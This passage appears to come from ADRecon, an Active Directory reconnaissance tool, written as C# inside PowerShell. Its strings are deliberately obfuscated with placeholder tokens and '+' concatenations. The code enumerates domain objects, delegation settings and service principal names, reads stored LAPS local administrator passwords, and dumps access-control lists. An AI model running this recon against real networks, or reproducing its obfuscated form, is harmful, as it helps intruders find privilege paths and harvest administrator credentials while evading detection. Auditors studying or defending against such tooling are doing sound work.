                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdOU = (PSObject) record;
                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdOU.Members[lEzjNamelEzj].Value));
                    OUObj.Members.Add(new PSNoteProperty(lEzjDepthlEzj, ((Convert.ToString(AdOU.Members[lEzjDistinguishedNamelEzj].Value).Split(new string[] { lEzjOU=lEzj }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty(lEzjDescriptionlEzj, AdOU.Members[lEzjDescriptionlEzj].Value));
                    OUObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdOU.Members[lEzjwhenCreatedlEzj].Value));
                    OUObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdOU.Members[lEzjwhenChangedlEzj].Value));
                    OUObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, AdOU.Members[lEzjDistinguishedNamelEzj].Value));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;

             '+'       PSObject'+' GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty(lEzjDisplayNamelEzj, CleanString(AdGPO.Members[lEzjDisplayNamelEzj].Value)));
                    GPOObj.Members.Add(new PSNo'+'teProperty(lEzjGUIDlEzj, CleanString(AdGPO.Members[lEzjNamelEzj].Value)));
                    GPOObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdGPO.Members[lEzjwhenCreatedlEzj].Value));
                    GPOObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdGPO.Members[lEzjwhenChangedlEzj].Value));
                    GPOObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, CleanString(AdGPO.Members[lEzjDistinguishedNamelEzj].Value)));
                    GPOObj.Members.Add(new PSNoteProperty(lEzjFilePathlEzj, AdGPO.Members[lEzjgPCFileSysPathlEzj].Value));
                    return new PSObject[] { GPOObj };
                '+'}
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;
                    ADWSClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Members[lEzjDistinguishedNamelEzj].Value).ToUpper()), (Convert.ToString(AdGPO.Members[lEzjDisplayNamelEzj].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
          '+'  public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSOM = (PSObject) record;
                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = Convert.ToString(AdSOM.Members[lEzjgPLinklEzj].Value);
                    string GPOName = null;

                    Depth = (Convert.ToString(AdSOM.Members[lEzjDistinguishedNamelEzj].Value).Split(new string[] { lEzjOU=lEzj }, StringSplitOptions.None)).'+'Length -1;
                    if (AdSOM.Members[lEzjgPOptionslEzj].Value != null && (int) AdSOM.Members[lEzjgPOptionslEzj].Value == 1)
                    {
                        BlockInheritance = true;
                    }
                    var GPLinks = gPLink.Split(xfJ4]xfJ4, x'+'fJ4[xfJ4).Where(x => x.StartsWith(lEzjLDAPlEzj));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdSOM.Members[lEzjNamelEzj].Value));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjDepthlEzj, Depth));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, AdSOM.Members[lEzjDistinguishedNamelEzj].Value));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjLink OrderlEzj, null));
                        SOMObj.Members.Add(new PSNote'+'Property(lEzjGPOlEzj, GPOName));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjEnforcedlEzj, Enforced));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjLink EnabledlEzj, LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjBlockInheritancelEzj, BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjgPLinklEzj, gPLink));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjgPOptionslEzj, AdSOM.Members[lEzjgPOptionslEzj].Value));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split(xfJ4/xfJ4, xfJ4;xfJ4);
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split(xfJ4=xfJ4,xfJ4,xfJ4)[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdSOM.Members[lEzjNamelEzj].Value));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjDepthlEzj, Depth));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, AdSOM.Members[lEzjDistinguishedNamelEzj].Value));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjLink OrderlEzj, Order));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjGPOlEzj, GPOName));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjEnforcedlEzj, Enforced));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjLink EnabledlEzj, LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjBlockInheritancelEzj, BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjgPLinklEzj, gPLink));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjgPOptionslEzj, AdSOM.Members[lEzjgPOptionslEzj].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdPrinter.Members[lEzj'+'NamelEzj].Value));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjServerNamelEzj, AdPrinter.Members[lEzjserverNamelEzj].Value));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjShareNamelEzj, ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (A'+'dPrinter.Members[lEzjprintShareNamelEzj].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjDriverNamelEzj, AdPrinter.Members[lEzjdriverNamelEzj].Value));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjDriverVersionlEzj, AdPrinter.Members[lEzjdriverVersionlEzj].Value));
                    PrinterObj.Members.Add(new PSNoteProp'+'erty(lEzjPortNamelEzj, ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members[lEzjportNamelEzj].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjURLlEzj, ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members[lEzjurllEzj].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdPrinter.Members[lEzjwhenCreatedlEzj].Value));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdPrinter.Members[lEzjwhenChangedlEzj].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    string SIDHistory = lEzjlEzj;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members[lEzjLastLogonDatelEzj].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members[lEzjlastLogonTimeStamplEzj].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members[lEzjLastLogonDatelEzj].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members[lEzjPasswordLastSetlEzj].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members[lEzjpwdLastSetlEzj].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members[lEzjPasswordLastSetlEzj].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members[lEzjTrustedForDelegationlEzj].Value) && ((int) AdComputer.Memb'+'ers[lEzjprimaryGroupIDlEzj].Value == 515) )
                    {
                        DelegationType = lEzjUnconstrainedlEzj;
                        DelegationServices = lEzjAnylEzj;
                    }
                    if (AdComputer.Members[lEzjmsDS-AllowedToDelegateTolEzj] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members[lEzjmsDS-AllowedToDelegateTolEzj].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = lEzjConstrainedlEzj;
                            foreach (var value in delegateto)
                            {
                                DelegationServices = DelegationServices + lEzj,lEzj + Convert.ToString(value);
                            }
                            DelegationServices = DelegationServices.TrimStart(xfJ4,xfJ4);
                        }
                    }
                    if ((bool) AdComputer.Members[lEzjTrustedToAuthForDelegationlEzj].Value)
                    {
                        DelegationProtocol = lEzjAnylEzj;
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = lEzjKerberoslEzj;
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members[lEzjSIDHistorylEzj].Value;
                    string sids = lEzjlEzj;
                    foreach (var value in history)
                    {
                        sids = sids + lEzj,lEzj + Convert.ToString(value);
                    }
                    S'+'IDHistory = sids.TrimStart(xfJ4,xfJ4);
                    string OperatingSystem = CleanString((AdComputer.Members[lEzjOperatingSystemlEzj].Value != null ? AdComputer.Members[lEzjOperatingSystemlEzj].Value : lEzj-lEzj) + lEzj lEzj + AdComputer.Members[lEzjOperatingSystemHotfixlEzj].Value + lEzj lEzj + AdComputer.Members[lEzjOperatingSystemServicePacklEzj].Value + lEzj lEzj + AdComputer.Members[lEzjOperatingSystemVersionlEzj].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjUserNamelEzj, CleanString(AdComputer.Members[lEzjSamAccountNamelEzj].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, CleanString(AdComputer.Members[lEzjNamelEzj].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDNSHostNamelEzj, AdComputer.Members[lEzjDNSHostNamelEzj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjEnabledlEzj, AdComputer.Members[lEzjEnabledlEzj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjIPv4AddresslEzj, AdComputer.Members[lEzjIPv4AddresslEzj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjOperating SystemlEzj, OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjLogon Age (days)lEzj, DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjPassword Age ('+'days)lEzj, DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDormant (> lEzj + DormantTimeSpan + lEzj days)lEzj, Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjPasswor'+'d Age (> lEzj + PassMaxAge + lEzj days)lEzj, PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDelegation TypelEzj, DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDelegation ProtocollEzj, DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDelegation ServiceslEzj, DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjPrimary Group IDlEzj, AdComputer.Members[lEzjprimaryGroupIDlEzj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjSIDlEzj, AdComputer.Members[lEzjSIDlEzj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjSIDHistorylEzj, SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDescriptionlEzj, CleanString(AdComputer.Members[lEzjDescriptionlEzj].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjms-ds-CreatorSidlEzj, AdComputer.Members[lEzjms-ds-CreatorSidlEzj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjLast Logon DatelEzj, LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjPassword LastSetlEzj, PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjUserAccountControllEzj, AdComputer.Members[lEzjUserAccountControllEzj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdComputer.Members[lEzjwhenCreatedlEzj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdComputer.Members[lEzjwhenChangedlEzj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDistinguished NamelEzj, AdComputer.Members[lEzjDistinguishedNamelEzj].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members[lEzjservicePrincipalNamelEzj].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in SPNs)
                    {
                        bool flag = true;
                        string[] SPNArray = SPN.Split(xfJ4/xfJ4);
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members[lEzjServicelEzj].Value == SPNArray[0] )
                            {
                                Obj.Members[lEzjHostlEzj].Value = string.Join(lEzj,lEzj, (Obj.Members[lEzjHostlEzj].Value + lEzj,lEzj + SPNArray[1]).Split(xfJ4,xfJ4).Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty(lEzjUse'+'rNamelEzj, CleanString(AdComputer.Members[lEzjSamAccountNamelEzj].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, CleanString(AdComputer.Members[lEzjNamelEzj].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(lEzjServicelEzj, SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(lEzjHostlEzj, SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );'+'
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members[lEzjms-Mcs-AdmPwdExpirationTimelEzj].Value));
                        PasswordStored = true;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty(lEzjHostnamelEzj, (AdComputer.Members[lEzjDNSHostNamelEzj].Value != null ? AdComputer.Members[lEzjDNSHostNamelEzj].Value : AdComputer.Members[lEzjCNlEzj].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty(lEzjStoredlEzj, PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty(lEzjReadablelEzj, (AdComputer.Members[lEzjms'+'-Mcs-AdmPwdlEzj].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty(lEzjPasswordlEzj, AdComputer.Members[lEzjms-Mcs-AdmPwdlEzj].Value));
                    LAPSObj.Member'+'s.Add(new PSNoteProperty(lEzjExpirationlEzj, CurrentExpiration));'+'
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members[lEzjObjectClasslEzj].Value))
                    {
                        case lEzjuserlEzj:
                        case lEzjcomputerlEzj:
                        case lEzjgrouplEzj:
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members[lEzjobjectsidlEzj].Value), Convert.ToString(AdObject.Members[lEzjNamelEzj].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members[lEzjNamelEzj].Value);

                    switch (Convert.ToString(AdObject.Members[lEzjobjectClasslEzj].Value))
                    {
                        case lEzjuserlEzj:
                            Type = lEzjUserlEzj;
                            break;
                        case lEzjcomputerlEzj:
                            Type = lEzjComputerlEzj;
                            break;
                        case lEzjgrouplEzj:
                            Type = lEzjGrouplEzj;
                            break;
                        case lEzjcontainerlEzj:
                            Type = lEzjContainerlEzj;
                            break;
                        c'+'ase lEzjgroupPolicyContainerlEzj:
                            Type = lEzjGPOlEzj;
                            Name = Convert.ToString(AdObject.Members[lEzjDisplayNamelEzj].Value);
                            break;
                        case lEzjorganizationalUnitlEzj:
                            Type = lEzjOUlEzj;
                            break;
             '+'           case lEzjdomainDNSlEzj:
                            Type = lEzjDomainlEzj;
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members[lEzjobjectClasslEzj].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members[lEzjntsecuritydescriptorlEzj] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members[lEzjntsecuritydescriptorlEzj].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjTypelEzj, Type));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectTypeNamelEzj, ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedObjectTypeNamelEzj, ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjActiveDirectoryRightslEzj, Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjAccessControlTypelEzj, Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjIdentityReferenceNamelEzj, ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjOwnerNamelE'+'zj, ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedlEzj, Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectFlagslEzj, Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritanceFlagslEzj, Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new P'+'SNoteProperty(lEzjInheritanceTypelEzj, Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjPropagationFlagslEzj, Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectTypelEzj, Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedObjectTypelEzj, Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjIdentityReferencelEzj, Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjOwnerlEzj, Owner));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, AdObject.Members[lEzjDistinguishedNam'+'elEzj].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members[lEzjNamelEzj].Value);

                    switch (Convert.ToString(AdObject.Members[lEzjobjectClasslEzj].Value))
                    {
                        case lEzjuserlEzj:
                            Type = lEzjUserlEzj;
                            break;
                        case lEzjcomputerlEzj:
                            Type = lEzjComputerlEzj;
                            break;
                        case lEzjgrouplEzj:
                            Type = lEzjGrouplEzj;
                            break;
                        case lEzjcontainerlEzj:
                            Type = lEzjContainerlEzj;
                            break;
                        case lEzjgroupPolicyContainerlEzj:
                            Type = lEzjGPOlEzj;
                            Name = Convert.ToString(AdObject.Members[lEzjDisplayNamelEzj].Value);
                            break;
                        case lEzjorganizationalUnitlEzj:
                            Type = lEzjOUlEzj;
                            break;
                        case lEzjdomainDNSlEzj:
                            Type = lEzjDomainlEzj;
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members[lEzjobjectClasslEzj].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members[lEzjntsecuritydescriptorlEzj] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members[lEzjntsecuritydescriptorlEzj].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjTypelEzj, Type));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectTypeNamelEzj, ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedOb'+'jectTypeNamelEzj, ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjActiveDirectoryRightslEzj, Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjIdentityReferencelEzj, Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjAuditFlagslEzj, Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectFlagslEzj, Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritanceFlagslEzj, Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritanceTypelEzj, Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedlEzj, Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjPropagationFlagslEzj, Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectTypelEzj, Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedObjectTypelEzj, Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }'+'
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
lEzj@

bLHLDAPSource = @lEzj
// Thanks Dennis Albuquerque for the C# multithreading code'+'
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO'+';
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {lEzj268435456lEzj, lEzj268435457lEzj, lEzj536870912lEzj, lEzj536870913lEzj} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { lEzj805306368lEzj } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { lEzj805306369lEzj }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { lEzj805306370lEzj } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
